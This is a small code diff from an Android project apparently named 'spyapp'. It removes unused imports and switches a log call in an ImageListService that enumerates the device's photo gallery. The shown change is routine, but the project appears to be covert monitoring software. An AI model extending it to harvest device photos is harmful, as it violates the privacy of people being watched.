@@ -2,7 +2,6 @@ package com.app.spyapp.service;
 
 import android.app.Activity;
 import android.app.IntentService;
-import android.app.Service;
 import android.content.Context;
 import android.content.Intent;
 import android.content.SharedPreferences;
@@ -10,10 +9,8 @@ import android.database.Cursor;
 import android.graphics.Bitmap;
 import android.net.Uri;
 import android.provider.MediaStore;
-import android.util.Log;
 
 import com.app.spyapp.SpyApp;
-import com.app.spyapp.common.Const;
 import com.app.spyapp.common.Pref;
 import com.app.spyapp.common.WriteLog;
 import com.app.spyapp.model.ImageModel;
@@ -148,7 +145,7 @@ public class ImageListService extends IntentService {
 
                 }
                 // Do something with the values.
-                Log.i("ListingImages", " bucket=" + bucket
+                WriteLog.E("ListingImages", " bucket=" + bucket
                         + "  date_taken=" + date);
             } while (cur.moveToNext());
         }
